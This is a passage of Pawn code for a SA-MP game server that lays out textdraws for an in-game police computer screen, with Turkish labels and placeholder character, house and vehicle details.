	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][16], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][16], true);

	PDMDC[playerid][17] = CreatePlayerTextDraw(playerid, 273.133483, 242.500106, "Giris_Yapiliyor..");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][17], 0.400000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][17], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][17], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][17], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][17], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][17], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][17], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][17], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][17], 0);

	PDMDC[playerid][18] = CreatePlayerTextDraw(playerid, 132.576889, 115.333366, "Oyuncu_Sorgula");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][18], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][18], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][18], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][18], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][18], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][18], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][18], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][18], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][18], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][18], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][18], 190, 20);

	PDMDC[playerid][19] = CreatePlayerTextDraw(playerid, 133.513931, 143.333282, "Ev_Sorgula");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][19], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][19], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][19], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][19], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][19], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][19], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][19], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][19], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][19], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][19], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][19], 190, 20);

	PDMDC[playerid][20] = CreatePlayerTextDraw(playerid, 195.827209, 78.583404, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][20], 0.000000, 29.349922);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][20], 193.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][20], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][20], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][20], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][20], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][20], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][20], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][20], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][20], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][20], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][20], 0);

	PDMDC[playerid][21] = CreatePlayerTextDraw(playerid, 133.982452, 172.499954, "Isyeri_Sorgula");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][21], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][21], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][21], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][21], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][21], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][21], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][21], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][21], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][21], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][21], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][21], 190, 20);

	PDMDC[playerid][22] = CreatePlayerTextDraw(playerid, 133.982452, 205.166610, "Arac_Sorgula");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][22], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][22], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][22], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][22], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][22], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][22], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][22], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][22], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][22], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][22], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][22], 190, 20);

	PDMDC[playerid][23] = CreatePlayerTextDraw(playerid, 133.986587, 236.083282, "Aranma_Kaydi");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][23], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][23], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][23], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][23], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][23], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][23], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][23], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][23], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][23], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][23], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][23], 190, 20);

	PDMDC[playerid][24] = CreatePlayerTextDraw(playerid, 259.078247, 181.250152, "Ad_:_Joseph_Alvares");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][24], 0.349999, 1.750000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][24], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][24], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][24], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][24], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][24], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][24], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][24], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][24], 0);

	PDMDC[playerid][25] = CreatePlayerTextDraw(playerid, 196.295761, 110.083358, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][25], 0.000000, -0.635429);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][25], 526.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][25], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][25], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][25], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][25], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][25], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][25], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][25], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][25], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][25], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][25], 0);

	PDMDC[playerid][26] = CreatePlayerTextDraw(playerid, 310.615112, 86.166687, "LSPD_-_MDC");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][26], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][26], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][26], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][26], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][26], 2);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][26], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][26], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][26], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][26], 0);

	PDMDC[playerid][27] = CreatePlayerTextDraw(playerid, 281.097930, 141.583297, "Memur_Bilgileri");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][27], 0.500000, 2.500000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][27], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][27], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][27], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][27], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][27], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][27], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][27], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][27], 0);

	PDMDC[playerid][28] = CreatePlayerTextDraw(playerid, 258.609741, 204.583419, "Rutbe_:_Cavus_I");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][28], 0.349999, 1.750000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][28], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][28], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][28], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][28], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][28], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][28], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][28], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][28], 0);

	PDMDC[playerid][29] = CreatePlayerTextDraw(playerid, 258.609741, 230.249938, "Rutbe_No_:_1610");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][29], 0.349999, 1.750000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][29], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][29], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][29], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][29], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][29], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][29], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][29], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][29], 0);

	PDMDC[playerid][30] = CreatePlayerTextDraw(playerid, 292.342834, 111.249977, "Joseph_Alvares__-_Yas:24_-_Irk:Ingiliz_-_Tel:53421");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][30], 0.200000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][30], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][30], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][30], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][30], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][30], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][30], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][30], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][30], 0);

	PDMDC[playerid][31] = CreatePlayerTextDraw(playerid, 259.546142, 133.999969, "GozRengi:Kahverengi_-_SacRengi:Kahverengi_-_Boy:1.70_-_Kilo:70");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][31], 0.200000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][31], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][31], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][31], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][31], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][31], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][31], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][31], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][31], 0);

	PDMDC[playerid][32] = CreatePlayerTextDraw(playerid, 225.344024, 170.750030, "Ev(playerid, 1)");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][32], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][32], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][32], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][32], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][32], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][32], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][32], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][32], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][32], 0);

	PDMDC[playerid][33] = CreatePlayerTextDraw(playerid, 297.027954, 166.666641, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][33], 0.000000, 19.604682);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][33], 294.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][33], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][33], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][33], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][33], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][33], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][33], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][33], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][33], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][33], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][33], 0);

	PDMDC[playerid][34] = CreatePlayerTextDraw(playerid, 417.438323, 166.666610, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][34], 0.000000, 19.604682);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][34], 412.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][34], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][34], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][34], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][34], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][34], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][34], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][34], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][34], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][34], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][34], 0);

	PDMDC[playerid][35] = CreatePlayerTextDraw(playerid, 329.921203, 171.050064, "Isyeri(playerid, 1)");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][35], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][35], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][35], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][35], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][35], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][35], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][35], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][35], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][35], 0);

	PDMDC[playerid][36] = CreatePlayerTextDraw(playerid, 451.268859, 171.050064, "Arac(playerid, 2)");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][36], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][36], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][36], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][36], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][36], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][36], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][36], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][36], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][36], 0);

	PDMDC[playerid][37] = CreatePlayerTextDraw(playerid, 202.386520, 200.500015, "Ev_Adres:_Vinewood_101");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][37], 0.200000, 1.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][37], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][37], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][37], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][37], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][37], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][37], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][37], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][37], 0);

	PDMDC[playerid][38] = CreatePlayerTextDraw(playerid, 308.272644, 199.916671, "Isyeri_Adres:_Idlewood_300");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][38], 0.200000, 1.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][38], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][38], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][38], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][38], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][38], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][38], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][38], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][38], 0);

	PDMDC[playerid][39] = CreatePlayerTextDraw(playerid, 436.179565, 199.916687, "Arac_Plaka:_9402KL");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][39], 0.200000, 1.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][39], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][39], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][39], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][39], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][39], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][39], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][39], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][39], 0);

	PDMDC[playerid][40] = CreatePlayerTextDraw(playerid, 255.797500, 172.499984, "Ev_Adres:_Vinewood_101");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][40], 0.340000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][40], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][40], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][40], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][40], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][40], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][40], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][40], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][40], 0);

	PDMDC[playerid][41] = CreatePlayerTextDraw(playerid, 255.797897, 192.916702, "Ev_Sahibi:_Joseph_Alvares");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][41], 0.340000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][41], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][41], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][41], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][41], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][41], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][41], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][41], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][41], 0);

	PDMDC[playerid][42] = CreatePlayerTextDraw(playerid, 256.266204, 212.749984, "Ev_Kiracisi:_Joseph_Alvares");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][42], 0.340000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][42], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][42], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][42], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][42], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][42], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][42], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][42], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][42], 0);

	PDMDC[playerid][43] = CreatePlayerTextDraw(playerid, 306.398376, 142.750045, "Ev_Bilgileri");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][43], 0.500000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][43], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][43], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][43], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][43], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][43], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][43], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][43], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][43], 0);

	PDMDC[playerid][44] = CreatePlayerTextDraw(playerid, 201.749603, 110.666702, "");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][44], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][44], 44.000000, 47.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][44], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][44], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][44], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][44], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][44], -256);
	PlayerTextDrawFont(playerid, PDMDC[playerid][44], 5);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][44], 0);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][44], 0);
	PlayerTextDrawSetPreviewModel(playerid, PDMDC[playerid][44], 120);
	PlayerTextDrawSetPreviewRot(playerid, PDMDC[playerid][44], 0.000000, 0.000000, 0.000000, 1.000000);

	PDMDC[playerid][45] = CreatePlayerTextDraw(playerid, 240.805145, 205.166488, "Bagli:Evet________________-_______Ceza:$100");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][45], 0.300000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][45], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][45], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][45], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][45], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][45], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][45], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][45], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][45], 0);

	PDMDC[playerid][46] = CreatePlayerTextDraw(playerid, 236.119934, 163.166549, "Sahibi:Joseph_Alvares____-______Vergi:$34");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][46], 0.300000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][46], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][46], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][46], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][46], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][46], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][46], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][46], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][46], 0);

	PDMDC[playerid][47] = CreatePlayerTextDraw(playerid, 179.729110, 86.749992, "");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][47], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][47], 90.000000, 90.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][47], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][47], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][47], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][47], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][47], -256);
	PlayerTextDrawFont(playerid, PDMDC[playerid][47], 5);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][47], 0);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][47], 0);
	PlayerTextDrawSetPreviewModel(playerid, PDMDC[playerid][47], 560);
	PlayerTextDrawSetPreviewRot(playerid, PDMDC[playerid][47], 0.000000, 0.000000, 45.000000, 1.399999);
	PlayerTextDrawSetPreviewVehCol(playerid, PDMDC[playerid][47], 1, 1);

	PDMDC[playerid][48] = CreatePlayerTextDraw(playerid, 266.573974, 122.916641, "Model:Sultan_______-______Plaka:9402KL");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][48], 0.300000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][48], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][48], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][48], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][48], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][48], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][48], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][48], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][48], 0);

	PDMDC[playerid][49] = CreatePlayerTextDraw(playerid, 195.827224, 165.500030, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][49], 0.000000, -0.401168);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][49], 526.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][49], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][49], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][49], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][49], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][49], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][49], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][49], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][49], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][49], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][49], 0);

	PDMDC[playerid][50] = CreatePlayerTextDraw(playerid, 214.099563, 324.750030, "Tel_Takip");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][50], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][50], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][50], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][50], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][50], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][50], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][50], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][50], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][50], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][50], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][50], 300, 20);

	PDMDC[playerid][51] = CreatePlayerTextDraw(playerid, 314.831756, 324.166687, "Sabika_Kaydi");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][51], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][51], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][51], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][51], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][51], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][51], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][51], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][51], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][51], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][51], true);
